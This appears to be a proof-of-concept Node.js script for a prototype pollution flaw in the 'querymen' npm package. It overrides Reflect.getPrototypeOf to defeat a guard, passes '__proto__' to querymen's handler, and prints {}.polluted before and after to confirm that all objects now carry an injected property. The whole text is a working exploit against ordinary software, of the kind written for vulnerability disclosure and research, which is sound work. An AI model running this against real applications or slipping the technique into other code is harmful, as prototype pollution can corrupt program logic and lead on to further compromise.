Reflect.getPrototypeOf = () => false;
var a = require('querymen');
obj = {};
console.log({}.polluted);
a.handler('__proto__', 'polluted', 'yes');
console.log({}.polluted);